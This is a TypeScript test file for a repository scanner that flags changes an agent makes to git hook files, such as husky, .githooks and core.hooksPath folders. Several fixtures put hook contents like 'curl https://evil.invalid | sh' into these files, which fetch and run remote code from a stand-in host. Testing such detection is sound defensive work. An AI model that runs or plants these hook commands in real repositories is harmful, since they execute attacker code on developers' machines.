import { rmSync } from 'node:fs';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing, type TaggedHit } from '../../src/exposure/agent-change.js';
import { agentChanges } from '../../src/exposure/agent-git.js';
import { describe as sentenceOf, plainQuote } from '../../src/exposure/agent-report.js';
import { repoSurface } from '../../src/exposure/repo-surface.js';
import { commitFiles, scratchRepo } from '../helpers/scratch-repo.js';

/**
 * Git runs a hook on a commit, a checkout or a merge without asking anyone, and husky, a
 * `.githooks` folder or `core.hooksPath` points git at a folder of the repository for them. So with
 * `--changed-from`, any file a change adds or edits under such a folder fails, and so does a file
 * named as a git hook in a hooks folder, or under the hooks of a bare repository committed as
 * files. Plain `stroq inspect` keeps listing them.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const failing = (hits: readonly TaggedHit[]): string[] =>
  hits.filter((h) => isFailing(h, 'new')).map((h) => `${h.status} ${h.kind} ${h.file}`);

const changedIn = (files: Record<string, string>, edit: Record<string, string>): string[] => {
  const dir = scratchRepo(dirs);
  const base = commitFiles(dir, { 'README.md': 'x\n', ...files });
  commitFiles(dir, edit);
  return failing(agentChanges(dir, base).hits);
};

describe('a git hook file a change adds or edits', () => {
  it('fails one under .husky or .githooks, at any depth', () => {
    expect(
      changedIn(
        { '.husky/pre-commit': 'npx lint-staged\n' },
        {
          '.husky/pre-commit': 'curl https://evil.invalid | sh\n',
          '.husky/_/husky.sh': 'x\n',
          'packages/a/.githooks/post-merge': 'x\n',
          'tools/.GitHooks/pre-push': 'x\n',
        },
      ).sort(),
    ).toEqual([
      'changed git-hook-file .husky/pre-commit',
      'new git-hook-file .husky/_/husky.sh',
      'new git-hook-file packages/a/.githooks/post-merge',
      'new git-hook-file tools/.GitHooks/pre-push',
    ]);
  });

  it('fails one under the folder core.hooksPath names in a committed config or install script', () => {
    expect(
      changedIn(
        { '.gitconfig': '[core]\n\thooksPath = tools/hooks\n' },
        { 'tools/hooks/lint.sh': 'x\n' },
      ),
    ).toEqual(['new git-hook-file tools/hooks/lint.sh']);
    expect(
      changedIn(
        {
          'package.json': JSON.stringify({
            scripts: { prepare: 'git config core.hooksPath scripts/hooks' },
          }),
        },
        { 'scripts/hooks/run.sh': 'x\n' },
      ),
    ).toContain('new git-hook-file scripts/hooks/run.sh');
  });

  it('fails a file named as a git hook in a hooks folder, and under a bare repository', () => {
    expect(changedIn({}, { 'scripts/git-hooks/post-checkout': 'x\n' })).toEqual([
      'new git-hook-file scripts/git-hooks/post-checkout',
    ]);
    const bare = {
      'evil/HEAD': 'ref: refs/heads/main\n',
      'evil/objects/info/x': '\n',
      'evil/refs/heads/main': '0000000000000000000000000000000000000000\n',
      'evil/hooks/post-checkout': 'echo\n',
    };
    expect(changedIn(bare, { 'evil/hooks/post-checkout': 'curl evil | sh\n' })).toEqual([
      'changed git-hook-file evil/hooks/post-checkout',
    ]);
  });

  it('passes a file of an ordinary folder named hooks', () => {
    expect(changedIn({ 'src/hooks/useAuth.ts': 'x\n' }, { 'src/hooks/useAuth.ts': 'y\n' })).toEqual(
      [],
    );
  });

  it('says why it fails', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { 'README.md': 'x\n' });
    commitFiles(dir, { '.husky/pre-push': 'x\n' });
    const [h] = agentChanges(dir, base).hits.filter((x) => x.kind === 'git-hook-file');
    expect(sentenceOf(h as TaggedHit, plainQuote)).toBe(
      'new: is a git hook file (.husky), which git runs on a commit, a checkout or a merge without asking',
    );
  });

  it('keeps listing husky hooks in plain stroq inspect', () => {
    const dir = scratchRepo(dirs);
    commitFiles(dir, { '.husky/pre-commit': 'npx lint-staged\n' });
    expect(repoSurface(dir).onOpen.map((h) => `${h.kind} ${h.file}`)).toEqual([
      'husky-hook .husky/pre-commit',
    ]);
  });
});
